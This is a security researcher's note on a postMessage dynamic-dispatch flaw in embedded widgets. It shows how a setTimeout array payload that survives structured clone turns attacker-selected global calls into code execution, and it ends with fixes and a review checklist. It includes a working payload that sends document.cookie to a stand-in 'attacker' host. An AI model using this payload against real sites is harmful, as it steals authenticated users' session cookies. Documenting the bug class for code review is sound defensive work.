# postMessage Dynamic Dispatch + setTimeout Array Gadget

## Date

2026-07-10

## Target Type

Embedded widgets, SDK handoff pages, debug/logging bridges, and review/admin-bot flows that accept `postMessage` commands

## Bug Class

Client-side trust failure through attacker-controlled function dispatch, structured-clone payload shaping, and legacy `setTimeout(string)` code execution

## Initial Signal

Look for handlers shaped like:

```javascript
window.addEventListener('message', (event) => {
  if (event.data && event.data.action === 'log') {
    window[event.data.func](event.data);
  }
});
```

Or any variant that does:

- `window[event.data.fn](...)`
- `this[event.data.method](...)`
- `parent[event.data.func](event.data)`

Also look for:

- no `event.origin` check
- debug-only actions exposed in production embeds
- partner/reviewer flows that open attacker URLs in authenticated sessions

## Pattern

The attacker does not need a classic reflected/stored XSS sink. The widget itself becomes the sink by calling attacker-selected globals.

### Why `eval` usually fails

Indirect eval does not execute attacker code:

```javascript
const payload = ['fetch("https://attacker/?c="+document.cookie)'];
window.eval(payload);        // indirect eval, no execution
window['eval'](payload);     // same
```

### Why `setTimeout` often works

Legacy timer APIs still coerce non-function first arguments to string and execute them:

```javascript
const payload = ['fetch("https://attacker/?c="+document.cookie)'];
window.setTimeout(payload);  // executes fetch(...)
```

`setInterval` may work the same way.

### Structured-clone constraints

`postMessage` uses structured clone. Useful observations:

| Payload shape | `action` / `func` survive? | Executes via `setTimeout`? |
|---|---|---|
| `{ action, func, toString() {...} }` | yes, but `toString` is stripped | no, becomes `[object Object]` |
| `new String(code)` with properties | no, properties stripped | no |
| `[code]` with `p.action` / `p.func` | yes | yes |

Working construction:

```javascript
const code = 'fetch("https://attacker/?c="+encodeURIComponent(document.cookie))';
const p = [code];
p.action = 'log';
p.func = 'setTimeout';
target.postMessage(p, '*');
```

## Failed Assumptions

- `func: 'eval'` will work because the payload "looks like code"
- custom `toString` survives `postMessage`
- iframe embedding is enough to steal reviewer cookies
- `fetch` exfil is always better than `Image` beacons; use whichever survives CSP/CORS in the target context

## Working Theory

Treat dynamic global dispatch as equivalent to a remote JavaScript call gadget. The exploit path is:

1. find a global callable through `window[name]`
2. choose one whose argument coercion turns your cloned object into executable code or a useful side effect
3. deliver the payload from a partner page, popup, or child frame accepted by the widget flow

## Fix

- hardcode allowed actions and methods; do not reflect user input into dispatch
- validate `event.origin`
- reject non-plain or unexpected payload types
- remove debug bridges from production embeds

## Future Checklist Item

When reviewing `postMessage` handlers, grep for:

- `window[` + event/data field
- `action === 'log'`
- `setTimeout(` / `setInterval(` / `eval(` anywhere near message listeners

Then test array payloads that survive structured clone before spending time on string-only XSS payloads.
